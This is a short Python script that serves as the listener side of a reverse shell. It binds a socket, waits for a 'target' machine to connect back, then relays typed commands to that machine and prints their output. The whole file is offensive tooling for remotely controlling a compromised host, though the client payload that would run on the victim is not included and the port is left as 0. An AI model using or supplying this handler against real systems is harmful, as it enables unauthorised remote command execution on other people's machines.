import socket
import sys

#define the host  and port to want the target to connect back 
host = '0.0.0.0'
port = 0

#creating the server
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#binding the server

s.bind((host,port))

#lisitng for the target

s.listen(5)

print("[*] Listing for connection on %s:%d"%(host,port))

#accepting the target 
target, addr = s.accept()

print("[*] Connection recieved from %s:%d"%(addr[0],addr[1]))

#main body of the program starts where we take input from the
#user and send it to the target and take back the output

print("A reverse shell has established you can now run commands!! (Enter 'exit' to exit)")



while True:

    n = input("RS:~# ")

    #checking for exit
    
    if n == 'exit':
        target.close()  
        s.close()
        sys.exit()

    #sending the command to the target
    
    target.send(str.encode(n))

    #Recieving back the output of the command

    response = target.recv(4096)

    print(str(response,'utf-8'))

